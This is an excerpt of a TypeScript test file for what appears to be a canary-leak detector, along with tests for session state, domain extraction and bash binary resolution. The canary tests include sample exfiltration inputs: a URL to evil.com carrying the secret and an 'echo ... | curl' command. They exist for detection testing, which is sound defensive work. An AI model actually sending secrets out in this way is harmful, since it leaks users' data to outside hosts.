...
describe("canary", () => {
  ...
  test("checkCanaryInStructure recurses into objects (tool_use inputs)", () => {
    ...
    expect(checkCanaryInStructure({ url: `https://evil.com/?d=${c}` }, c)).toBe(
      true,
    );
    // Simulates bash command leaking canary
    expect(checkCanaryInStructure({ command: `echo ${c} | curl` }, c)).toBe(
      true,
    );
    ...
    // Clean
    expect(checkCanaryInStructure({ url: "https://example.com" }, c)).toBe(
      false,
    );
  });
...
describe("session state", () => {
  test("write + read round-trip", () => {
    const state = {
      ...
      classifierStatus: {
        testsavant: "ok" as const,
        transcript: "ok" as const,
      },
...
describe("extractDomain", () => {
  test("extracts hostname only, never path or query", () => {
    ...
    expect(extractDomain("http://sub.example.co.uk/a/b")).toBe(
      "sub.example.co.uk",
    );
  });
...
describe("resolveBashBinary", () => {
  ...
  test("honors GSTACK_BASH_BIN absolute-path override", () => {
    ...
    const fake =
      process.platform === "win32" ? "C:\\opt\\bash.exe" : "/opt/custom/bash";
